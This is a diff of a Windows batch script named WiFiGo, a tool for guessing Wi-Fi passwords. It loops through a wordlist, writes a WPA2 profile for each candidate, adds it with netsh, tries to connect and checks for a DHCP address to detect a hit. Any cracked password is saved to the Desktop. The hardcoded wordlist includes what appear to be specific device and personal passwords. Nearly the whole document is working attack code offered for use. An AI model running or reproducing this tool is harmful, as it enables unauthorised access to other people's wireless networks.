@@ -1,4 +1,15 @@
 @echo off
+:: This Sets The console Window to fit the Script Output
+:Setting_Screen
+    mode 66,33
+:: Requirements bulding the needed directories
+:Requirements
+    mkdir %temp%\WifiGo
+    mkdir %temp%\WifiGo\TMP
+    mkdir %temp%\WifiGo\TMP\SUB
+    set theMain=%temp%\WifiGo\         
+    set theTmp=%temp%\WifiGo\TMP\
+    set theSub=%temp%\WifiGo\TMP\SUB\
 :: Welcome screen and Software usage
 :Welcom
     cls
@@ -76,10 +87,10 @@
     echo.
     echo           ! Copy and Paste The Selected Network Name !
     echo.
-        netsh wlan show networks | find /c "SSID" > cou.tmp
-        set /p n=<cou.tmp
+        netsh wlan show networks | find /c "SSID" > %theTmp%cou.tmp
+        set /p n=<%theTmp%cou.tmp
+        del %theTmp%cou.tmp
         if "%n%"=="0" (
-           del cou.tmp
            goto :Brake
         ) else (
         echo Networks Available :
@@ -137,11 +148,7 @@
              set /p SNN=Paste Here :
              call :Convert "%SNN%"
 
-:: Requirements bulding the needed directories
-:Requirements
-    mkdir WifiGo
-    mkdir WifiGo\TMP
-    mkdir WifiGo\TMP\SUB
+
 
 :: Profile Settings Function Just Display The Settings For The user
 :: And Offer to select a Built in Wordlist Or Custom List
@@ -205,7 +212,7 @@
 :Built_In_List
     setlocal
        for /d %%i in (11111111,22222222,33333333,44444444,55555555,66666666,Zerokool,77777777,88888888,99999999,00000000,12345678,87654321,1234567890,0987654321,123456789,987654321,qqqqqqqq,wwwwwwww,eeeeeeee,rrrrrrrr,tttttttt,yyyyyyyy,uuuuuuuu,iiiiiiii,oooooooo,pppppppp,aaaaaaaa,ssssssss,dddddddd,ffffffff,gggggggg,hhhhhhhh,jjjjjjjj,kkkkkkkk,llllllll,zzzzzzzz,xxxxxxxx,cccccccc,vvvvvvvv,bbbbbbbb,nnnnnnnn,mmmmmmmm,Qqqqqqqq,Wwwwwwww,Eeeeeeee,Rrrrrrrr,Tttttttt,Yyyyyyyy,Uuuuuuuu,Iiiiiiii,Oooooooo,Pppppppp,Aaaaaaaa,Ssssssss,Dddddddd,Ffffffff,Gggggggg,Hhhhhhhh,Jjjjjjjj,Kkkkkkkk,Llllllll,Zzzzzzzz,Xxxxxxxx,Cccccccc,Vvvvvvvv,Bbbbbbbb,Nnnnnnnn,Mmmmmmmm,1111111111,2222222222,3333333333,4444444444,5555555555,6666666666,7777777777,8888888888,9999999999,0000000000,111111111,222222222,333333333,444444444,555555555,666666666,777777777,888888888,999999999,000000000,0917964004,095513388,12121212,23232323,34343434,45454545,56565656,67676767,78787878,89898989,10101010,09090909,98989898,87878787,76767676,65656565,54545454,43434343,32323232,21212121,1212121212,2323232323,3434343434,4545454545,5656565656,6767676767,7878787878,8989898989,9090909090,1010101010,0909090909,9898989898,8787878787,7676767676,6565656565,5454545454,4343434343,3232323232,2121212121,sabryglaxy,AndroidAP,Galaxy_A02D66F,Galaxy-A02D66F,GalaxyA02D66F,galaxya02D66f,Galaxya02D66f,Password,Pa$$word,Pa$w0rd,Pa$$w0rd,Pa$$W0rd,PA$$W0RD,My_Password,My_P@$$w0rd,my-password,mypassword,password) do (
-           echo %%i >> WifiGo\TMP\wordlist.tmp
+           echo %%i >> %theTmp%wordlist.tmp
        )
        cls
        echo ##################################################################
@@ -218,7 +225,7 @@
        echo.
        echo          Built-In WordList Is Generated Succesfully !
        echo.
-       set wordlist=WifiGo\TMP\wordlist.tmp
+       set wordlist=%theTmp%wordlist.tmp
        goto :main
     endlocal
 
@@ -274,11 +281,11 @@
        ) else (
           goto :User_Dec_Check
        )
-    rem the part whech user path input function checks for validity
+    rem the part whech user path input function checks for validity  
     :User_Dec_Check
-       type %UserPath% | find /v /c "~" >count.tmp
-       set /p cnt=<count.tmp
-       del count.tmp
+       type %UserPath% | find /v /c "~" > %theTmp%count.tmp
+       set /p cnt=<%temp%\WifiGo\TMP\count.tmp
+       del %theTmp%count.tmp
        if "%cnt%"=="0" (
              cls
              echo ##################################################################
@@ -316,10 +323,9 @@
              echo.
              echo                 Initilizing Dectiunary Attack ...
              echo.
-                   timeout /t 3 /nobreak >nul
-             copy %UserPath% WifiGo\TMP\wordlist.tmp >nul
+             copy %UserPath% %temp%\WifiGo\TMP\wordlist.tmp >nul
              timeout /t 2 /nobreak >nul
-             set wordlist=WifiGo\TMP\wordlist.tmp
+             set wordlist=%temp%\WifiGo\TMP\wordlist.tmp
              goto :main
        )
     endlocal  
@@ -334,40 +340,39 @@
     :loop
         for /f %%i in (%wordlist%) do (
         rem This is the Profile Template To Use  :Starts Here:
-        echo ^<?xml version="1.0"?^>> WiFi-%SNN2%.xml
-        echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>>> WiFi-%SNN2%.xml
-        echo 	 ^<name^>%SNN%^</name^>>> WiFi-%SNN2%.xml
-        echo 	 ^<SSIDConfig^>>> WiFi-%SNN2%.xml
-        echo 		 ^<SSID^>>> WiFi-%SNN2%.xml
-        echo 			 ^<hex^>%hex%^</hex^>>> WiFi-%SNN2%.xml            
-        echo 			 ^<name^>%SNN%^</name^>>> WiFi-%SNN2%.xml    
-        echo 		 ^</SSID^>>> WiFi-%SNN2%.xml         
-        echo 	 ^</SSIDConfig^>>> WiFi-%SNN2%.xml      
-        echo 	 ^<connectionType^>ESS^</connectionType^>>> WiFi-%SNN2%.xml          
-        echo 	 ^<connectionMode^>auto^</connectionMode^>>> WiFi-%SNN2%.xml
-        echo 	 ^<MSM^>>> WiFi-%SNN2%.xml
-        echo 		 ^<security^>>> WiFi-%SNN2%.xml
-        echo 			 ^<authEncryption^>>> WiFi-%SNN2%.xml
-        echo 				 ^<authentication^>WPA2PSK^</authentication^>>> WiFi-%SNN2%.xml
-        echo 				 ^<encryption^>AES^</encryption^>>> WiFi-%SNN2%.xml
-        echo 				 ^<useOneX^>false^</useOneX^>>> WiFi-%SNN2%.xml
-        echo 			 ^</authEncryption^>>> WiFi-%SNN2%.xml
-        echo 			 ^<sharedKey^>>> WiFi-%SNN2%.xml
-        echo 				 ^<keyType^>passPhrase^</keyType^>>> WiFi-%SNN2%.xml
-        echo 				 ^<protected^>false^</protected^>>> WiFi-%SNN2%.xml
-        echo 				 ^<keyMaterial^>%%i^</keyMaterial^>>> WiFi-%SNN2%.xml
-        echo 			 ^</sharedKey^>>> WiFi-%SNN2%.xml
-        echo 		 ^</security^>>> WiFi-%SNN2%.xml
-        echo 	 ^</MSM^>>> WiFi-%SNN2%.xml
-        echo 	 ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^>>> WiFi-%SNN2%.xml
-        echo 		 ^<enableRandomization^>false^</enableRandomization^>>> WiFi-%SNN2%.xml
-        echo  	 ^</MacRandomization^>>> WiFi-%SNN2%.xml
-        echo ^</WLANProfile^>>> WiFi-%SNN2%.xml
+        echo ^<?xml version="1.0"?^>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 	 ^<name^>%SNN%^</name^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 	 ^<SSIDConfig^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 		 ^<SSID^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 			 ^<hex^>%hex%^</hex^>>> %temp%\WifiGo\WiFi-%SNN2%.xml            
+        echo 			 ^<name^>%SNN%^</name^>>> %temp%\WifiGo\WiFi-%SNN2%.xml    
+        echo 		 ^</SSID^>>> %temp%\WifiGo\WiFi-%SNN2%.xml         
+        echo 	 ^</SSIDConfig^>>> %temp%\WifiGo\WiFi-%SNN2%.xml      
+        echo 	 ^<connectionType^>ESS^</connectionType^>>> %temp%\WifiGo\WiFi-%SNN2%.xml          
+        echo 	 ^<connectionMode^>auto^</connectionMode^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 	 ^<MSM^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 		 ^<security^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 			 ^<authEncryption^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 				 ^<authentication^>WPA2PSK^</authentication^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 				 ^<encryption^>AES^</encryption^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 				 ^<useOneX^>false^</useOneX^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 			 ^</authEncryption^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 			 ^<sharedKey^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 				 ^<keyType^>passPhrase^</keyType^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 				 ^<protected^>false^</protected^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 				 ^<keyMaterial^>%%i^</keyMaterial^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 			 ^</sharedKey^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 		 ^</security^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 	 ^</MSM^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 	 ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo 		 ^<enableRandomization^>false^</enableRandomization^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo  	 ^</MacRandomization^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
+        echo ^</WLANProfile^>>> %temp%\WifiGo\WiFi-%SNN2%.xml
         rem This is the Profile Template To Use  :Ends Here:
-    
         rem This Will Add The Profile And Connect To It 
-              netsh wlan add profile filename=WiFi-%SNN2%.xml interface="WiFi" >nul
-              del WiFi-%SNN2%.xml >nul
+              netsh wlan add profile filename=%temp%\WifiGo\WiFi-%SNN2%.xml interface="WiFi" >nul
+             rem del %temp%\WifiGo\WiFi-%SNN2%.xml >nul
               netsh wlan connect SSID=%SNN2% name=%SNN2% >nul
               timeout /t 2 >nul
     
@@ -391,31 +396,55 @@
               echo                    Testing Word    : %%i
               echo.
               set pass=%%i
-              more +1 WifiGo\TMP\wordlist.tmp > WifiGo\TMP\SUB\wordlist.tmp
-              del WifiGo\TMP\wordlist.tmp >nul
-              move WifiGo\TMP\SUB\wordlist.tmp WifiGo\TMP\wordlist.tmp >nul
+              more +1 %theTmp%wordlist.tmp > %theSub%wordlist.tmp
+              del %theTmp%wordlist.tmp >nul
+              move %theSub%wordlist.tmp %theTmp%wordlist.tmp >nul
               goto :Condetion
             )
     rem Condetion Function handel the check for match from the template filling loop after init connection
     :condetion
     rem condetion looking for the most rare charector used in passwords "~" to count the wodlist 
-       type WifiGo\TMP\wordlist.tmp | find /v /c "~" >WifiGo\TMP\count.tmp
-       set /p cnt=<WifiGo\TMP\count.tmp
+       type %theTmp%wordlist.tmp | find /v /c "~" >%theTmp%count.tmp
+       set /p cnt=<%theTmp%count.tmp
        echo                    Remaining Words : %cnt%
        echo.
-       del WifiGo\TMP\count.tmp
+       del %theTmp%count.tmp
        rem This if Statment checks if the wordlist has words or empty "1"=Empty
-       if "%cnt%"=="1" (
-          echo No Match Found !!
-         goto :eof
+       if "%cnt%"=="0" (
+          cls
+             echo ##################################################################
+             echo ###                                                            ###
+             echo ###                       WiFiGo, V 1.0.0                      ###
+             echo ###                         By Siddiq Jr                       ###
+             echo ###                                                            ###
+             echo ###                Wifi Network Word Spaying Mode              ###
+             echo ###                                                            ###
+             echo ###                         2022 - 2023                        ###
+             echo ###                                                            ###
+             echo ##################################################################
+             echo.
+             echo.
+             echo                *********************************
+             echo               ^|        No Match Found !      ^|
+             echo                *********************************
+             echo.
+             echo                  Try To Use an Other Dictunary 
+             echo.
+             echo.          If The Password Is Too Strong It Takeks Time
+             echo.
+             echo                *********************************
+             echo.
+             echo.
+             timeout /t 5 /nobreak >nul
+         goto :End
        ) else (
           goto :Statment
        )
        rem Statment function Actualy check for real ip address existance to determin if
        rem The connection was successful, and breakout of the main loop if it is
        :Statment
-          ipconfig /showclassid WiFi | find "There are no DHCPv4 classes defined for WiFi."> WifiGo\TMP\Condetion.tmp
-          set /p condetion=<WifiGo\TMP\Condetion.tmp
+          ipconfig /showclassid WiFi | find "There are no DHCPv4 classes defined for WiFi."> %theTmp%Condetion.tmp
+          set /p condetion=<%theTmp%Condetion.tmp
           if "%condetion%"=="There are no DHCPv4 classes defined for WiFi." (
              cls
              echo ##################################################################
@@ -477,30 +506,29 @@
                 echo Invalid Input, Please Type [Y/N] Only !
                 goto :Success
              )
-      :Cleaning
-          rmdir /s /q WifiGo
-      endlocal
-       goto :Ending
+:Cleaning
+    rmdir /s /q %temp%\WifiGo
+ goto :Ending
 
 :: save to text function just prints its output to a textfile on Desktop
 :Save2txtFunc
-    echo ################################################################## > %USERPROFILE%\Desktop\%SNN%.txt
-    echo ###                                                            ### >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo ###                       WiFiGo, V 1.0.0                      ### >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo ###                         By Siddiq Jr                       ### >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo ###                         2022 - 2023                        ### >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo ###                                                            ### >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo ################################################################## >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo                    Network Name : %SNN%                            >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo                    Password     : %pass%                           >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
-    echo ****************************************************************** >> %USERPROFILE%\Desktop\%SNN%.txt
+    echo ################################################################## > %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo ###                                                            ### >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo ###                       WiFiGo, V 1.0.0                      ### >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo ###                         By Siddiq Jr                       ### >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo ###                         2022 - 2023                        ### >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo ###                                                            ### >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo ################################################################## >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo.                                                                   >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo.                                                                   >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo.                                                                   >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo                    Network Name : %SNN%                            >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo.                                                                   >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo                    Password     : %pass%                           >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo.                                                                   >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo.                                                                   >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo.                                                                   >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
+    echo ****************************************************************** >> %USERPROFILE%\Desktop\WiFiGo-%SNN%.txt
     goto:Cleaning
 
 :: Ending Function, Shows the crached password for the last time 
@@ -531,6 +559,11 @@
     echo                  Thank You For Using My Tool
     echo.
     echo                           Bay Bay !
+    echo.
+    echo.
+    echo.
+    echo.
+    endlocal
     goto :eof
 :: End Function is the goodbay screen 
 :End
@@ -558,6 +591,9 @@
     echo                           Bay !
     echo.
     echo.
-    echo                 Press Any Key To Exit...
-    timeout /t 300 >nul
+    echo.
+    echo.
+    echo.
+    timeout /t 3 >nul
+    rmdir /s /q %temp%\WifiGo
     goto :eof
